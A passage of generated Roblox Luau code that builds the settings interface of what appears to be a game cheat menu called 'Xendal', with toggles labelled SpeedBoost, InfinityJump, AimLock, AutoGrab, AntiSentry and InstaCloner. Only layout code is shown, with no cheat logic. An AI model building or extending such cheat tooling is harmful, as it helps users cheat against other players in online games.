G2L["102"] = Instance.new("Frame", G2L["101"]);
G2L["102"]["BorderSizePixel"] = 0;
G2L["102"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["102"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["102"]["Position"] = UDim2.new(0.01, 15, 0.011, 0);
G2L["102"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["102"]["Name"] = [[SpeedBoost]];
G2L["102"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoost.UICorner
G2L["103"] = Instance.new("UICorner", G2L["102"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoost.UIStroke
G2L["104"] = Instance.new("UIStroke", G2L["102"]);
G2L["104"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoost.TextLabel
G2L["105"] = Instance.new("TextLabel", G2L["102"]);
G2L["105"]["BorderSizePixel"] = 0;
G2L["105"]["TextSize"] = 14;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["BackgroundTransparency"] = 1;
G2L["105"]["Size"] = UDim2.new(0, 88, 0, 16);
G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["105"]["Text"] = [[Speed Boost]];
G2L["105"]["Position"] = UDim2.new(0.07231, 0, 0.253, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle
G2L["106"] = Instance.new("Frame", G2L["101"]);
G2L["106"]["BorderSizePixel"] = 0;
G2L["106"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["106"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["106"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["106"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["106"]["Name"] = [[SpeedBoostToggle]];
G2L["106"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Main Handler
G2L["107"] = Instance.new("LocalScript", G2L["106"]);
G2L["107"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder
G2L["108"] = Instance.new("Frame", G2L["106"]);
G2L["108"]["ZIndex"] = 2;
G2L["108"]["BorderSizePixel"] = 0;
G2L["108"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["108"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["108"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["108"]["Position"] = UDim2.new(0.459, 0, -4.4, -2);
G2L["108"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["108"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Circle
G2L["109"] = Instance.new("Frame", G2L["108"]);
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["109"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["109"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["109"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["109"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["109"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Circle.Mini
G2L["10a"] = Instance.new("Frame", G2L["109"]);
G2L["10a"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["10a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["10a"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["10a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["10a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["10a"]["Name"] = [[Mini]];
G2L["10a"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Circle.Mini.UICorner
G2L["10b"] = Instance.new("UICorner", G2L["10a"]);
G2L["10b"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Circle.UICorner
G2L["10c"] = Instance.new("UICorner", G2L["109"]);
G2L["10c"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Button
G2L["10d"] = Instance.new("TextButton", G2L["108"]);
G2L["10d"]["BorderSizePixel"] = 0;
G2L["10d"]["TextSize"] = 14;
G2L["10d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["10d"]["BackgroundTransparency"] = 1;
G2L["10d"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["10d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["10d"]["Text"] = [[]];
G2L["10d"]["Name"] = [[Button]];
G2L["10d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.Button.LocalScript
G2L["10e"] = Instance.new("LocalScript", G2L["10d"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.UIPadding
G2L["10f"] = Instance.new("UIPadding", G2L["108"]);
G2L["10f"]["PaddingTop"] = UDim.new(0, 4);
G2L["10f"]["PaddingRight"] = UDim.new(0, 4);
G2L["10f"]["PaddingLeft"] = UDim.new(0, 4);
G2L["10f"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.SpeedBoostToggle.Holder.UICorner
G2L["110"] = Instance.new("UICorner", G2L["108"]);
G2L["110"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.UIPadding
G2L["111"] = Instance.new("UIPadding", G2L["101"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJump
G2L["112"] = Instance.new("Frame", G2L["101"]);
G2L["112"]["BorderSizePixel"] = 0;
G2L["112"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["112"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["112"]["Position"] = UDim2.new(0.01, 15, 0.18217, -5);
G2L["112"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["112"]["Name"] = [[InfinityJump]];
G2L["112"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJump.UICorner
G2L["113"] = Instance.new("UICorner", G2L["112"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJump.TextLabel
G2L["114"] = Instance.new("TextLabel", G2L["112"]);
G2L["114"]["TextWrapped"] = true;
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["TextSize"] = 14;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["114"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["BackgroundTransparency"] = 1;
G2L["114"]["Size"] = UDim2.new(0, 78, 0, 16);
G2L["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["114"]["Text"] = [[InfinityJump]];
G2L["114"]["Position"] = UDim2.new(0.087, 0, 0.251, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJump.UIStroke
G2L["115"] = Instance.new("UIStroke", G2L["112"]);
G2L["115"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Noflymeduse
G2L["116"] = Instance.new("Frame", G2L["101"]);
G2L["116"]["BorderSizePixel"] = 0;
G2L["116"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["116"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["116"]["Position"] = UDim2.new(0.01, 15, 0.34742, -5);
G2L["116"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["116"]["Name"] = [[Noflymeduse]];
G2L["116"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Noflymeduse.UICorner
G2L["117"] = Instance.new("UICorner", G2L["116"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Noflymeduse.TextLabel
G2L["118"] = Instance.new("TextLabel", G2L["116"]);
G2L["118"]["TextWrapped"] = true;
G2L["118"]["BorderSizePixel"] = 0;
G2L["118"]["TextSize"] = 14;
G2L["118"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["118"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["118"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["118"]["BackgroundTransparency"] = 1;
G2L["118"]["Size"] = UDim2.new(0, 88, 0, 16);
G2L["118"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["118"]["Text"] = [[Noflymeduse]];
G2L["118"]["Position"] = UDim2.new(0.1, -9, 0.271, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Noflymeduse.UIStroke
G2L["119"] = Instance.new("UIStroke", G2L["116"]);
G2L["119"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpin
G2L["11a"] = Instance.new("Frame", G2L["101"]);
G2L["11a"]["BorderSizePixel"] = 0;
G2L["11a"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["11a"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["11a"]["Position"] = UDim2.new(0.01, 15, 0.42842, -5);
G2L["11a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11a"]["Name"] = [[JumpSpin]];
G2L["11a"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpin.UICorner
G2L["11b"] = Instance.new("UICorner", G2L["11a"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpin.TextLabel
G2L["11c"] = Instance.new("TextLabel", G2L["11a"]);
G2L["11c"]["TextWrapped"] = true;
G2L["11c"]["BorderSizePixel"] = 0;
G2L["11c"]["TextSize"] = 14;
G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["11c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11c"]["BackgroundTransparency"] = 1;
G2L["11c"]["Size"] = UDim2.new(0, 63, 0, 16);
G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["Text"] = [[JumpSpin]];
G2L["11c"]["Position"] = UDim2.new(0.1, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpin.UIStroke
G2L["11d"] = Instance.new("UIStroke", G2L["11a"]);
G2L["11d"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti Sentry
G2L["11e"] = Instance.new("Frame", G2L["101"]);
G2L["11e"]["BorderSizePixel"] = 0;
G2L["11e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["11e"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["11e"]["Position"] = UDim2.new(0.01, 15, 0.508, -5);
G2L["11e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11e"]["Name"] = [[Anti Sentry]];
G2L["11e"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti Sentry.UICorner
G2L["11f"] = Instance.new("UICorner", G2L["11e"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti Sentry.TextLabel
G2L["120"] = Instance.new("TextLabel", G2L["11e"]);
G2L["120"]["TextWrapped"] = true;
G2L["120"]["BorderSizePixel"] = 0;
G2L["120"]["TextSize"] = 14;
G2L["120"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["120"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["120"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["120"]["BackgroundTransparency"] = 1;
G2L["120"]["Size"] = UDim2.new(0, 68, 0, 16);
G2L["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["120"]["Text"] = [[AntiSentry]];
G2L["120"]["Position"] = UDim2.new(0.10223, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti Sentry.UIStroke
G2L["121"] = Instance.new("UIStroke", G2L["11e"]);
G2L["121"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Aimlock
G2L["122"] = Instance.new("Frame", G2L["101"]);
G2L["122"]["BorderSizePixel"] = 0;
G2L["122"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["122"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["122"]["Position"] = UDim2.new(0.01, 15, 0.58941, -5);
G2L["122"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["122"]["Name"] = [[Aimlock]];
G2L["122"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Aimlock.UICorner
G2L["123"] = Instance.new("UICorner", G2L["122"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Aimlock.TextLabel
G2L["124"] = Instance.new("TextLabel", G2L["122"]);
G2L["124"]["TextWrapped"] = true;
G2L["124"]["BorderSizePixel"] = 0;
G2L["124"]["TextSize"] = 14;
G2L["124"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["124"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["124"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["124"]["BackgroundTransparency"] = 1;
G2L["124"]["Size"] = UDim2.new(0, 56, 0, 16);
G2L["124"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["124"]["Text"] = [[AimLock]];
G2L["124"]["Position"] = UDim2.new(0.1, -5, 0.27, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Aimlock.UIStroke
G2L["125"] = Instance.new("UIStroke", G2L["122"]);
G2L["125"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrab
G2L["126"] = Instance.new("Frame", G2L["101"]);
G2L["126"]["BorderSizePixel"] = 0;
G2L["126"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["126"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["126"]["Position"] = UDim2.new(0.01, 15, 0.67157, -5);
G2L["126"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["Name"] = [[AutoGrab]];
G2L["126"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrab.UICorner
G2L["127"] = Instance.new("UICorner", G2L["126"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrab.TextLabel
G2L["128"] = Instance.new("TextLabel", G2L["126"]);
G2L["128"]["TextWrapped"] = true;
G2L["128"]["BorderSizePixel"] = 0;
G2L["128"]["TextSize"] = 14;
G2L["128"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["128"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["128"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["128"]["BackgroundTransparency"] = 1;
G2L["128"]["Size"] = UDim2.new(0, 62, 0, 17);
G2L["128"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["128"]["Text"] = [[AutoGrab]];
G2L["128"]["Position"] = UDim2.new(0.1, -5, 0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AutoGrab.UIStroke
G2L["129"] = Instance.new("UIStroke", G2L["126"]);
G2L["129"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrab
G2L["12a"] = Instance.new("Frame", G2L["101"]);
G2L["12a"]["BorderSizePixel"] = 0;
G2L["12a"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["12a"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["12a"]["Position"] = UDim2.new(0.01, 15, 0.75248, -5);
G2L["12a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12a"]["Name"] = [[InstaGrab]];
G2L["12a"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrab.UICorner
G2L["12b"] = Instance.new("UICorner", G2L["12a"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrab.TextLabel
G2L["12c"] = Instance.new("TextLabel", G2L["12a"]);
G2L["12c"]["TextWrapped"] = true;
G2L["12c"]["BorderSizePixel"] = 0;
G2L["12c"]["TextSize"] = 14;
G2L["12c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["12c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12c"]["BackgroundTransparency"] = 1;
G2L["12c"]["Size"] = UDim2.new(0, 62, 0, 17);
G2L["12c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12c"]["Text"] = [[InstaGrab]];
G2L["12c"]["Position"] = UDim2.new(0.1, -5, 0.24, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InstaGrab.UIStroke
G2L["12d"] = Instance.new("UIStroke", G2L["12a"]);
G2L["12d"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Broken
G2L["12e"] = Instance.new("Frame", G2L["101"]);
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["12e"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["12e"]["Position"] = UDim2.new(0.01, 15, 0.913, -5);
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Name"] = [[Broken]];
G2L["12e"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Broken.UICorner
G2L["12f"] = Instance.new("UICorner", G2L["12e"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Broken.TextLabel
G2L["130"] = Instance.new("TextLabel", G2L["12e"]);
G2L["130"]["TextWrapped"] = true;
G2L["130"]["BorderSizePixel"] = 0;
G2L["130"]["TextSize"] = 14;
G2L["130"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["130"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["130"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["130"]["BackgroundTransparency"] = 1;
G2L["130"]["Size"] = UDim2.new(0, 59, 0, 17);
G2L["130"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["130"]["Text"] = [[Broken]];
G2L["130"]["Position"] = UDim2.new(0.06923, -5, 0.21, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Broken.UIStroke
G2L["131"] = Instance.new("UIStroke", G2L["12e"]);
G2L["131"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpBoost
G2L["132"] = Instance.new("Frame", G2L["101"]);
G2L["132"]["BorderSizePixel"] = 0;
G2L["132"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["132"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["132"]["Position"] = UDim2.new(0.01, 15, 0.1, -5);
G2L["132"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["132"]["Name"] = [[JumpBoost]];
G2L["132"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpBoost.UICorner
G2L["133"] = Instance.new("UICorner", G2L["132"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpBoost.TextLabel
G2L["134"] = Instance.new("TextLabel", G2L["132"]);
G2L["134"]["BorderSizePixel"] = 0;
G2L["134"]["TextSize"] = 14;
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["134"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["134"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["134"]["BackgroundTransparency"] = 1;
G2L["134"]["Size"] = UDim2.new(0, 83, 0, 16);
G2L["134"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["134"]["Text"] = [[Jump Boost]];
G2L["134"]["Position"] = UDim2.new(0.07077, 0, 0.253, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpBoost.UIStroke
G2L["135"] = Instance.new("UIStroke", G2L["132"]);
G2L["135"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimations
G2L["136"] = Instance.new("Frame", G2L["101"]);
G2L["136"]["BorderSizePixel"] = 0;
G2L["136"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["136"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["136"]["Position"] = UDim2.new(0.01, 15, 0.26618, -5);
G2L["136"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["136"]["Name"] = [[NoAnimations]];
G2L["136"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimations.UICorner
G2L["137"] = Instance.new("UICorner", G2L["136"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimations.TextLabel
G2L["138"] = Instance.new("TextLabel", G2L["136"]);
G2L["138"]["TextWrapped"] = true;
G2L["138"]["BorderSizePixel"] = 0;
G2L["138"]["TextSize"] = 14;
G2L["138"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["138"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["138"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["138"]["BackgroundTransparency"] = 1;
G2L["138"]["Size"] = UDim2.new(0, 88, 0, 16);
G2L["138"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["138"]["Text"] = [[NoAnimations]];
G2L["138"]["Position"] = UDim2.new(0.1, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimations.UIStroke
G2L["139"] = Instance.new("UIStroke", G2L["136"]);
G2L["139"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Cloner
G2L["13a"] = Instance.new("Frame", G2L["101"]);
G2L["13a"]["BorderSizePixel"] = 0;
G2L["13a"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["13a"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["13a"]["Position"] = UDim2.new(0.01, 15, 0.83137, -5);
G2L["13a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13a"]["Name"] = [[Cloner]];
G2L["13a"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Cloner.UICorner
G2L["13b"] = Instance.new("UICorner", G2L["13a"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Cloner.TextLabel
G2L["13c"] = Instance.new("TextLabel", G2L["13a"]);
G2L["13c"]["TextWrapped"] = true;
G2L["13c"]["BorderSizePixel"] = 0;
G2L["13c"]["TextSize"] = 14;
G2L["13c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["13c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13c"]["BackgroundTransparency"] = 1;
G2L["13c"]["Size"] = UDim2.new(0, 78, 0, 17);
G2L["13c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13c"]["Text"] = [[InstaCloner]];
G2L["13c"]["Position"] = UDim2.new(0.08769, -5, 0.23999, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Cloner.UIStroke
G2L["13d"] = Instance.new("UIStroke", G2L["13a"]);
G2L["13d"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle
G2L["13e"] = Instance.new("Frame", G2L["101"]);
G2L["13e"]["BorderSizePixel"] = 0;
G2L["13e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13e"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["13e"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["13e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13e"]["Name"] = [[JumptBoostToggle]];
G2L["13e"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Main Handler
G2L["13f"] = Instance.new("LocalScript", G2L["13e"]);
G2L["13f"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder
G2L["140"] = Instance.new("Frame", G2L["13e"]);
G2L["140"]["ZIndex"] = 2;
G2L["140"]["BorderSizePixel"] = 0;
G2L["140"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["140"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["140"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["140"]["Position"] = UDim2.new(0.459, 0, -3.8, -2);
G2L["140"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["140"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Circle
G2L["141"] = Instance.new("Frame", G2L["140"]);
G2L["141"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["141"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["141"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["141"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["141"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Circle.Mini
G2L["142"] = Instance.new("Frame", G2L["141"]);
